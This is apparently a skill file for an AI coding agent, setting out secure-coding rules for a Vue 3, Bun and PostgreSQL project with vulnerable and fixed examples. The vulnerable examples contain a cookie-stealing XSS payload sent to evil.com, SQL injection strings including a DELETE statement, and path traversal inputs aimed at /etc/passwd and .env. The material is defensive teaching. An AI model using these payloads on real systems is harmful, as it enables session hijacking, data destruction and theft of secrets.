---
name: security-auditor
description: Detects hardcoded secrets, SQL injection, XSS, path traversal, and insecure storage vulnerabilities. Specialized for Vue 3, TypeScript, Bun, PostgreSQL, and Redis in Poneglyph System. Keywords - security audit, vulnerability, sql injection, xss, secrets detection, security scan, vulnerability scan, security review
version: 1.0.0
---

# Security Auditor

Enforce secure coding practices in Poneglyph System by detecting vulnerabilities, preventing common attack vectors, and guiding secure implementations for Vue 3 + TypeScript frontend and Bun + PostgreSQL backend.

## When to Use This Skill

### Explicit Contexts
Activate when:
- Implementing authentication or authorization
- Handling user input or external data
- Storing sensitive information (tokens, credentials, API keys)
- Implementing file operations (upload, download, path handling)
- Making API calls or database queries
- Working with WebSocket connections
- Reviewing code for security vulnerabilities
- Implementing encryption or hashing

### Proactive Detection
Auto-suggest when detecting:
- Hardcoded API keys, tokens, secrets, or database credentials in code
- User input used without validation or sanitization
- File paths constructed from user input
- Plain text storage of sensitive data
- SQL queries constructed with string concatenation
- Vue templates with v-html (XSS risk)
- Redis connection strings without authentication
- WebSocket connections without authentication
- eval() or Function() usage in TypeScript/JavaScript
- Unencrypted HTTP requests

## Core Security Patterns (MANDATORY)

### 1. Input Validation & Sanitization (Vue 3 + TypeScript)

**Rule**: ALL user inputs MUST be validated and sanitized before processing, storage, or display using centralized validators.

❌ **WRONG - No validation, direct use**:
```typescript
// ❌ No validation on user input (Vue 3 component)
<script setup lang="ts">
import { ref } from 'vue';

const userName = ref('');

// ❌ Unvalidated input directly sent to API
async function saveUser() {
  await fetch('/api/users', {
    method: 'POST',
    body: JSON.stringify({ name: userName.value }) // ❌ No validation
  });
}
</script>

<template>
  <input v-model="userName" />
  <button @click="saveUser">Save</button>
</template>

<!-- RISK: XSS, injection attacks, malformed data -->
```

✅ **CORRECT - Centralized validation with Zod**:
```typescript
// utils/validators.ts - Centralized validation
import { z } from 'zod';

export const userNameSchema = z.string()
  .min(1, 'Name is required')
  .max(50, 'Name must be 50 characters or less')
  .regex(/^[a-zA-Z\s]+$/, 'Name can only contain letters and spaces')
  .transform(val => val.trim());

export const emailSchema = z.string()
  .email('Invalid email address')
  .toLowerCase();

export const eventNameSchema = z.string()
  .min(1, 'Event name is required')
  .max(100, 'Event name too long')
  .regex(/^[a-zA-Z0-9\s_-]+$/, 'Invalid characters in event name');

// ✅ Vue component with validation
<script setup lang="ts">
import { ref } from 'vue';
import { userNameSchema } from '@/utils/validators';

const userName = ref('');
const errors = ref<string[]>([]);

async function saveUser() {
  try {
    // ✅ Validate before sending
    const validatedName = userNameSchema.parse(userName.value);

    await fetch('/api/users', {
      method: 'POST',
      body: JSON.stringify({ name: validatedName })
    });

    errors.value = [];
  } catch (err) {
    if (err instanceof z.ZodError) {
      errors.value = err.errors.map(e => e.message);
    }
  }
}
</script>

<template>
  <div>
    <input v-model="userName" />
    <button @click="saveUser">Save</button>
    <p v-for="error in errors" :key="error" class="error">{{ error }}</p>
  </div>
</template>
```

**Validation Rules (Poneglyph System)**:
- User names: Letters + spaces only, max 50 chars
- Event names: Alphanumeric + spaces/underscores, max 100 chars
- Timestamps: ISO 8601 format validation
- Email: RFC-compliant regex
- Numeric fields: Type validation + range checks
- URLs: Protocol validation (https only)

**Auto-Check**:
- [ ] All user inputs validated with Zod schemas?
- [ ] Input trimmed before storage (.trim())?
- [ ] Range validation applied to numeric inputs?
- [ ] Email/URL patterns validated?

### 2. SQL Injection Prevention (PostgreSQL + TypeScript)

**Rule**: NEVER construct SQL queries with string concatenation. ALWAYS use parameterized queries or ORM.

❌ **WRONG - String concatenation in SQL query**:
```typescript
// ❌ SQL injection vulnerability (Bun backend)
async function getEventsByUser(userId: string) {
  // ❌ User input directly in query
  const query = `SELECT * FROM events WHERE user_id = '${userId}'`;

  const result = await db.query(query);
  return result.rows;
}

// User can inject: userId = "1' OR '1'='1"
// Resulting query: SELECT * FROM events WHERE user_id = '1' OR '1'='1'
// RESULT: Returns ALL events, bypassing authentication
```

❌ **WRONG - Template literals without parameterization**:
```typescript
// ❌ Still vulnerable even with template literals
async function searchEvents(searchTerm: string) {
  const query = `
    SELECT * FROM events
    WHERE event_data::text ILIKE '%${searchTerm}%'
  `;
  return await db.query(query);
}

// User can inject: searchTerm = "%'; DELETE FROM events; --"
// RISK: Data deletion, unauthorized access
```

✅ **CORRECT - Parameterized queries**:
```typescript
// ✅ Parameterized query with pg library (Poneglyph System)
import { Pool } from 'pg';

const db = new Pool({
  connectionString: process.env.DATABASE_URL
});

async function getEventsByUser(userId: string) {
  // ✅ Parameterized query - SQL injection safe
  const query = `SELECT * FROM events WHERE user_id = $1`;

  const result = await db.query(query, [userId]);
  return result.rows;
}

async function searchEvents(searchTerm: string) {
  // ✅ JSONB query with parameterization
  const query = `
    SELECT * FROM events
    WHERE event_data::text ILIKE $1
  `;

  // ✅ Sanitize search term (add wildcards safely)
  const sanitizedTerm = `%${searchTerm.replace(/[%_]/g, '\\$&')}%`;

  return await db.query(query, [sanitizedTerm]);
}

async function getEventsByType(eventType: string) {
  // ✅ JSONB field access with parameterization
  const query = `
    SELECT * FROM events
    WHERE event_data->>'event_type' = $1
    ORDER BY created_at DESC
  `;

  return await db.query(query, [eventType]);
}
```

**PostgreSQL Safety Checklist (Poneglyph System)**:
- ✅ Use parameterized queries ($1, $2, etc.) for all user inputs
- ✅ Escape wildcards (%, _) in LIKE/ILIKE queries
- ✅ Use JSONB operators (->>, ->) with parameterization for event_data queries
- ✅ Validate input before query (Zod schemas)
- ❌ NEVER use string concatenation or template literals with user input
- ❌ NEVER use raw SQL with user-controlled WHERE clauses

**Auto-Check**:
- [ ] All SQL queries use parameterized format ($1, $2)?
- [ ] No string concatenation or template literals with user input?
- [ ] LIKE/ILIKE wildcards properly escaped?
- [ ] JSONB queries use parameterization?

### 3. XSS Prevention (Vue 3 Templates)

**Rule**: NEVER use v-html with user-generated content. Always use text interpolation {{ }} or DOMPurify for HTML sanitization.

❌ **WRONG - v-html with user content**:
```vue
<!-- ❌ XSS vulnerability in Vue template -->
<script setup lang="ts">
import { ref } from 'vue';

const userComment = ref(''); // User input
const comments = ref<string[]>([]);

function addComment() {
  comments.value.push(userComment.value); // ❌ No sanitization
}
</script>

<template>
  <div>
    <input v-model="userComment" />
    <button @click="addComment">Add Comment</button>

    <!-- ❌ XSS: User can inject <script>alert('XSS')</script> -->
    <div v-for="comment in comments" :key="comment" v-html="comment"></div>
  </div>
</template>

<!-- User inputs: <img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)"> -->
<!-- RESULT: Cookie theft, session hijacking -->
```

✅ **CORRECT - Text interpolation (safe by default)**:
```vue
<!-- ✅ Vue text interpolation automatically escapes HTML -->
<script setup lang="ts">
import { ref } from 'vue';

const userComment = ref('');
const comments = ref<string[]>([]);

function addComment() {
  // ✅ Additional validation (optional but recommended)
  if (userComment.value.trim()) {
    comments.value.push(userComment.value.trim());
    userComment.value = '';
  }
}
</script>

<template>
  <div>
    <input v-model="userComment" />
    <button @click="addComment">Add Comment</button>

    <!-- ✅ Text interpolation - XSS safe (Vue escapes HTML automatically) -->
    <div v-for="comment in comments" :key="comment">
      {{ comment }}
    </div>
  </div>
</template>

<!-- User inputs: <script>alert('XSS')</script> -->
<!-- RENDERED AS: &lt;script&gt;alert('XSS')&lt;/script&gt; -->
<!-- SAFE: Displayed as text, not executed -->
```

✅ **CORRECT - DOMPurify for trusted HTML (if absolutely needed)**:
```vue
<!-- ✅ DOMPurify sanitization for trusted HTML content -->
<script setup lang="ts">
import { ref, computed } from 'vue';
import DOMPurify from 'isomorphic-dompurify';

const userHTML = ref('');

// ✅ Sanitize HTML with DOMPurify
const sanitizedHTML = computed(() => {
  return DOMPurify.sanitize(userHTML.value, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOW_DATA_ATTR: false
  });
});
</script>

<template>
  <div>
    <!-- ✅ Only use v-html with sanitized content -->
    <div v-html="sanitizedHTML"></div>
  </div>
</template>
```

**Vue XSS Prevention Checklist**:
- ✅ Use {{ }} text interpolation for user content (default behavior)
- ✅ If v-html needed, sanitize with DOMPurify first
- ✅ Whitelist allowed HTML tags and attributes
- ❌ NEVER use v-html with raw user input
- ❌ NEVER use v-html with data from API without sanitization

**Auto-Check**:
- [ ] All user content displayed with {{ }} interpolation?
- [ ] v-html only used with DOMPurify sanitization?
- [ ] Allowed tags/attributes whitelisted?
- [ ] No raw user content in v-html?

### 4. No Hardcoded Secrets (TypeScript + Bun)

**Rule**: NEVER hardcode API keys, tokens, secrets, database credentials, or Redis connection strings in source code. Use environment variables.

❌ **WRONG - Hardcoded secrets in code**:
```typescript
// ❌ CRITICAL: Secrets in source code (committed to git!)
// backend/src/db.ts
export const dbConfig = {
  host: 'localhost',
  port: 5432,
  user: 'postgres',
  password: 'super_secret_password_123', // ❌ Hardcoded
  database: 'poneglyph'
};

// ❌ Redis connection string hardcoded
export const redisUrl = 'redis://:secret_redis_password@localhost:6379'; // ❌ Exposed

// ❌ API key hardcoded
export const API_KEY = 'sk_live_51H7gK2L...'; // ❌ Leaked

// RISK: Secrets exposed in git history, decompiled code, CI logs
```

❌ **WRONG - Secrets in .env committed to git**:
```bash
# .env (❌ committed to git repository)
DATABASE_URL=postgresql://user:password@localhost:5432/db
REDIS_URL=redis://:password@localhost:6379
API_KEY=sk_live_51H7gK2L...
```

✅ **CORRECT - Environment variables with .env.example**:
```typescript
// ✅ Load from environment variables (backend/src/db.ts)
import { Pool } from 'pg';

// ✅ Load from .env file (NOT committed to git)
export const db = new Pool({
  connectionString: process.env.DATABASE_URL
});

if (!process.env.DATABASE_URL) {
  throw new Error('DATABASE_URL environment variable is required');
}

// ✅ Redis connection from environment
export const redisUrl = process.env.REDIS_URL || 'redis://localhost:6379';

// ✅ API key from environment
export const apiKey = process.env.API_KEY;

if (!apiKey) {
  throw new Error('API_KEY environment variable is required');
}
```

```bash
# .env (✅ added to .gitignore, NOT committed)
DATABASE_URL=postgresql://postgres:local_dev_password@localhost:5432/poneglyph
REDIS_URL=redis://:dev_redis_password@localhost:6379
API_KEY=sk_live_51H7gK2L...
WEBSOCKET_SECRET=your_websocket_secret_here
```

```bash
# .env.example (✅ committed to git as template)
DATABASE_URL=postgresql://user:password@localhost:5432/poneglyph
REDIS_URL=redis://:password@localhost:6379
API_KEY=your_api_key_here
WEBSOCKET_SECRET=your_websocket_secret_here
```

```gitignore
# .gitignore (✅ ensure .env is excluded)
.env
.env.local
.env.production
*.env
```

**Environment Variable Checklist (Poneglyph System)**:
- ✅ DATABASE_URL in .env (PostgreSQL connection string)
- ✅ REDIS_URL in .env (Redis connection with auth)
- ✅ API_KEY in .env (external API keys)
- ✅ WEBSOCKET_SECRET in .env (WebSocket authentication)
- ✅ .env added to .gitignore
- ✅ .env.example committed (template with placeholder values)
- ❌ NEVER commit .env to git
- ❌ NEVER hardcode passwords, tokens, or API keys

**Auto-Check**:
- [ ] No hardcoded strings matching password/key patterns?
- [ ] .env file added to .gitignore?
- [ ] All secrets loaded from process.env?
- [ ] .env.example provided as template?

### 5. Path Traversal Prevention (Bun File Operations)

**Rule**: NEVER construct file paths from user input. Use whitelisted directories + sanitized filenames only.

❌ **WRONG - User input directly in path**:
```typescript
// ❌ Path traversal vulnerability (Bun backend)
async function loadUserFile(filename: string) {
  // User can input: "../../../etc/passwd"
  const filePath = `/app/uploads/${filename}`; // ❌ No sanitization

  const file = Bun.file(filePath);
  return await file.text();
}

// User exploits:
// - filename = "../../config/.env"
// - Access secrets and configuration files
```

✅ **CORRECT - Sanitized filename + whitelisted directory**:
```typescript
// ✅ Path traversal prevention (Bun backend)
import path from 'path';

// ✅ Whitelisted upload directory
const UPLOAD_DIR = path.resolve('/app/uploads');

async function loadUserFile(filename: string) {
  // ✅ Sanitize filename: remove path separators
  const sanitized = path.basename(filename); // Strips ../ and /

  // ✅ Validate filename characters (alphanumeric + safe chars only)
  if (!/^[a-zA-Z0-9_\-\.]+$/.test(sanitized)) {
    throw new Error(`Invalid filename characters: ${sanitized}`);
  }

  // ✅ Construct safe path within whitelisted directory
  const safePath = path.join(UPLOAD_DIR, sanitized);

  // ✅ Double-check: ensure resolved path is still inside UPLOAD_DIR
  const resolvedPath = path.resolve(safePath);
  if (!resolvedPath.startsWith(UPLOAD_DIR)) {
    throw new Error(`Path traversal attempt blocked: ${filename}`);
  }

  // ✅ Safe to load file
  const file = Bun.file(resolvedPath);

  // ✅ Check if file exists
  if (!(await file.exists())) {
    throw new Error(`File not found: ${sanitized}`);
  }

  return await file.text();
}

async function uploadUserFile(filename: string, content: string) {
  // ✅ Apply same sanitization for uploads
  const sanitized = path.basename(filename);

  if (!/^[a-zA-Z0-9_\-\.]+$/.test(sanitized)) {
    throw new Error(`Invalid filename: ${filename}`);
  }

  const safePath = path.join(UPLOAD_DIR, sanitized);
  const resolvedPath = path.resolve(safePath);

  if (!resolvedPath.startsWith(UPLOAD_DIR)) {
    throw new Error(`Path traversal attempt blocked: ${filename}`);
  }

  // ✅ Safe to write file
  await Bun.write(resolvedPath, content);

  return { filename: sanitized, path: safePath };
}
```

**Path Safety Checklist (Bun)**:
- ✅ Use path.basename() to strip directory components
- ✅ Validate filename with alphanumeric + safe chars regex
- ✅ Use path.resolve() + startsWith() to verify final path is inside safe directory
- ✅ Define whitelisted directories (UPLOAD_DIR, LOGS_DIR, etc.)
- ❌ NEVER concatenate user input with file paths
- ❌ NEVER trust user-provided file extensions without validation

**Auto-Check**:
- [ ] All file paths use whitelisted directories?
- [ ] User-provided filenames sanitized with path.basename()?
- [ ] Filename regex validation applied?
- [ ] Path resolution verification with startsWith()?

### 6. WebSocket Authentication (Bun WebSocket Server)

**Rule**: ALWAYS authenticate WebSocket connections before allowing communication. NEVER trust client-provided identifiers.

❌ **WRONG - Unauthenticated WebSocket**:
```typescript
// ❌ No authentication on WebSocket connection (Bun server)
Bun.serve({
  port: 3000,
  fetch(req, server) {
    // ❌ Accept all WebSocket connections without verification
    if (server.upgrade(req)) {
      return; // WebSocket upgraded
    }

    return new Response('Not a WebSocket', { status: 400 });
  },
  websocket: {
    message(ws, message) {
      // ❌ No verification of sender identity
      const data = JSON.parse(message);

      // ❌ Broadcast to all without authorization check
      ws.send(JSON.stringify({ type: 'broadcast', data }));
    }
  }
});

// RISK: Unauthorized access, data leakage, spoofing
```

✅ **CORRECT - Authenticated WebSocket with JWT**:
```typescript
// ✅ WebSocket authentication with JWT (Bun server)
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET!;

interface WSData {
  userId: string;
  authenticated: boolean;
}

Bun.serve({
  port: 3000,
  fetch(req, server) {
    // ✅ Extract auth token from query params or headers
    const url = new URL(req.url);
    const token = url.searchParams.get('token') || req.headers.get('Authorization')?.replace('Bearer ', '');

    if (!token) {
      return new Response('Unauthorized: Missing token', { status: 401 });
    }

    try {
      // ✅ Verify JWT token
      const decoded = jwt.verify(token, JWT_SECRET) as { userId: string };

      // ✅ Upgrade with authenticated user data
      if (server.upgrade(req, {
        data: {
          userId: decoded.userId,
          authenticated: true
        } as WSData
      })) {
        return; // WebSocket upgraded with auth
      }
    } catch (err) {
      return new Response('Unauthorized: Invalid token', { status: 401 });
    }

    return new Response('Failed to upgrade', { status: 500 });
  },
  websocket: {
    message(ws, message) {
      // ✅ Access authenticated user data
      const { userId, authenticated } = ws.data as WSData;

      if (!authenticated) {
        ws.close(1008, 'Unauthorized');
        return;
      }

      const data = JSON.parse(message);

      // ✅ Authorize actions based on user identity
      if (data.type === 'subscribe') {
        // Check if user has permission to subscribe to this room
        if (canUserAccessRoom(userId, data.room)) {
          ws.subscribe(data.room);
          ws.send(JSON.stringify({ type: 'subscribed', room: data.room }));
        } else {
          ws.send(JSON.stringify({ type: 'error', message: 'Unauthorized' }));
        }
      }
    },
    close(ws) {
      // ✅ Clean up on disconnect
      const { userId } = ws.data as WSData;
      console.log(`User ${userId} disconnected`);
    }
  }
});

function canUserAccessRoom(userId: string, room: string): boolean {
  // ✅ Implement room-level authorization logic
  // Example: Check if user has permission to access this room
  return true; // Replace with actual authorization check
}
```

**WebSocket Security Checklist (Poneglyph System)**:
- ✅ Verify JWT token before upgrading WebSocket connection
- ✅ Store authenticated user data in ws.data
- ✅ Implement room-level authorization (canUserAccessRoom)
- ✅ Close unauthorized connections with ws.close()
- ✅ Use secure WebSocket (wss://) in production
- ❌ NEVER trust client-provided user IDs
- ❌ NEVER allow unauthenticated WebSocket connections

**Auto-Check**:
- [ ] WebSocket upgrade verifies JWT token?
- [ ] User identity stored in ws.data?
- [ ] Room subscriptions authorized per user?
- [ ] Secure WebSocket (wss://) in production?

## Anti-Patterns to PREVENT

### 1. Direct User Input Without Validation (Vue 3)

❌ **ANTI-PATTERN**:
```vue
<script setup lang="ts">
const userName = ref('');

function saveUser() {
  // ❌ No validation
  fetch('/api/users', { method: 'POST', body: JSON.stringify({ name: userName.value }) });
}
</script>
```

✅ **CORRECT**:
```typescript
import { userNameSchema } from '@/utils/validators';

function saveUser() {
  const validatedName = userNameSchema.parse(userName.value); // ✅ Zod validation
  fetch('/api/users', { method: 'POST', body: JSON.stringify({ name: validatedName }) });
}
```

### 2. SQL Injection via String Concatenation

❌ **ANTI-PATTERN**:
```typescript
const query = `SELECT * FROM events WHERE user_id = '${userId}'`; // ❌ SQL injection
```

✅ **CORRECT**:
```typescript
const query = `SELECT * FROM events WHERE user_id = $1`; // ✅ Parameterized
await db.query(query, [userId]);
```

### 3. XSS via v-html Without Sanitization

❌ **ANTI-PATTERN**:
```vue
<div v-html="userComment"></div> <!-- ❌ XSS vulnerability -->
```

✅ **CORRECT**:
```vue
<div>{{ userComment }}</div> <!-- ✅ Auto-escaped -->
<!-- OR -->
<div v-html="DOMPurify.sanitize(userComment)"></div> <!-- ✅ Sanitized -->
```

### 4. Hardcoded Database Credentials

❌ **ANTI-PATTERN**:
```typescript
const db = new Pool({
  password: 'super_secret_123' // ❌ Hardcoded
});
```

✅ **CORRECT**:
```typescript
const db = new Pool({
  connectionString: process.env.DATABASE_URL // ✅ Environment variable
});
```

### 5. Path Traversal in File Operations

❌ **ANTI-PATTERN**:
```typescript
const file = Bun.file(`/uploads/${userFilename}`); // ❌ Path traversal
```

✅ **CORRECT**:
```typescript
const sanitized = path.basename(userFilename); // ✅ Strip ../
const safePath = path.join(UPLOAD_DIR, sanitized);
if (!path.resolve(safePath).startsWith(UPLOAD_DIR)) throw new Error();
```

### 6. Unauthenticated WebSocket Connections

❌ **ANTI-PATTERN**:
```typescript
websocket: {
  message(ws, message) {
    ws.send(data); // ❌ No auth check
  }
}
```

✅ **CORRECT**:
```typescript
websocket: {
  message(ws, message) {
    const { authenticated } = ws.data;
    if (!authenticated) { ws.close(); return; } // ✅ Auth check
    ws.send(data);
  }
}
```

## Validation Checklist

### Critical (Must Pass)
- [ ] All user inputs validated with Zod schemas?
- [ ] All SQL queries use parameterized format ($1, $2)?
- [ ] No v-html with unsanitized user content?
- [ ] No hardcoded secrets (API keys, passwords, connection strings)?
- [ ] File paths use path.basename() + whitelisted directories?
- [ ] WebSocket connections authenticate with JWT?

### High Priority
- [ ] .env file added to .gitignore?
- [ ] XSS prevention: {{ }} interpolation or DOMPurify?
- [ ] PostgreSQL JSONB queries parameterized?
- [ ] Redis connection strings from environment?
- [ ] Path resolution verified with startsWith()?
- [ ] WebSocket room authorization implemented?

### Best Practices
- [ ] Input trimmed before storage (.trim())?
- [ ] Range validation on numeric inputs?
- [ ] LIKE/ILIKE wildcards escaped?
- [ ] eval() and Function() avoided in TypeScript?
- [ ] HTTPS/WSS in production?
- [ ] DOMPurify whitelist configured for allowed tags?

## Poneglyph System-Specific Security Checks

### PostgreSQL Events Table Security
```typescript
// ✅ Safe JSONB query with parameterization
async function getEventsByType(eventType: string) {
  const query = `
    SELECT * FROM events
    WHERE event_data->>'event_type' = $1
    ORDER BY created_at DESC
  `;
  return await db.query(query, [eventType]);
}
```

### Redis Security
```typescript
// ✅ Secure Redis connection with authentication
import { createClient } from 'redis';

const redisClient = createClient({
  url: process.env.REDIS_URL // ✅ Includes authentication: redis://:password@host:port
});

// ❌ Never hardcode Redis passwords
// const redisClient = createClient({ password: 'hardcoded_password' }); // ❌ WRONG
```

### Vue 3 Component Security
```vue
<!-- ✅ Safe event data display -->
<script setup lang="ts">
import { ref } from 'vue';

const events = ref<Event[]>([]);

// ✅ Fetch events from authenticated API
async function loadEvents() {
  const response = await fetch('/api/events', {
    headers: {
      'Authorization': `Bearer ${getAuthToken()}` // ✅ Auth header
    }
  });
  events.value = await response.json();
}
</script>

<template>
  <div v-for="event in events" :key="event.id">
    <!-- ✅ Text interpolation (safe) -->
    <h3>{{ event.event_type }}</h3>
    <p>{{ event.description }}</p>

    <!-- ❌ NEVER use v-html with event data -->
    <!-- <div v-html="event.description"></div> ❌ -->
  </div>
</template>
```

### Bun Server Security
```typescript
// ✅ Secure Bun HTTP server with CORS and rate limiting
Bun.serve({
  port: 3000,
  fetch(req) {
    // ✅ CORS headers (whitelist specific origins)
    const origin = req.headers.get('origin');
    const allowedOrigins = ['https://poneglyph.app', 'https://app.poneglyph.com'];

    if (origin && allowedOrigins.includes(origin)) {
      return new Response('...', {
        headers: {
          'Access-Control-Allow-Origin': origin,
          'Access-Control-Allow-Credentials': 'true'
        }
      });
    }

    // ✅ Reject unauthorized origins
    return new Response('Forbidden', { status: 403 });
  }
});
```

## Success Criteria

**Security Compliance**:
- [ ] Zero hardcoded secrets in codebase
- [ ] 100% user input validation coverage (Zod)
- [ ] All SQL queries parameterized
- [ ] No v-html without DOMPurify sanitization
- [ ] All file operations use path.basename() + validation
- [ ] WebSocket connections authenticate with JWT

**Input Validation (Vue 3 + TypeScript)**:
- [ ] All form inputs use Zod schemas
- [ ] Validation errors displayed to user
- [ ] Input trimmed before storage
- [ ] Numeric inputs have range validation

**SQL Security (PostgreSQL)**:
- [ ] All queries use parameterized format
- [ ] JSONB queries parameterized
- [ ] Wildcards escaped in LIKE/ILIKE
- [ ] No raw SQL with user input

**XSS Prevention (Vue 3)**:
- [ ] Text interpolation {{ }} used by default
- [ ] v-html only with DOMPurify sanitization
- [ ] Allowed HTML tags whitelisted
- [ ] No raw user content in templates

**Secret Management**:
- [ ] .env file added to .gitignore
- [ ] .env.example committed as template
- [ ] All secrets loaded from process.env
- [ ] No passwords or API keys in code

**WebSocket Security (Bun)**:
- [ ] JWT verification before upgrade
- [ ] User identity in ws.data
- [ ] Room authorization implemented
- [ ] Secure WebSocket (wss://) in production

## References

| Component | Security Focus | Implementation |
|-----------|---------------|----------------|
| `utils/validators.ts` | Zod schemas for input validation | Centralized validation functions |
| `backend/src/db.ts` | PostgreSQL connection with parameterized queries | pg library with $1, $2 placeholders |
| `backend/src/websocket.ts` | WebSocket authentication with JWT | Bun WebSocket server with auth |
| `frontend/src/components/*.vue` | XSS prevention with {{ }} interpolation | Vue 3 text binding |
| `.env.example` | Secret management template | Environment variable examples |

Use this skill to maintain security best practices across the Poneglyph System!
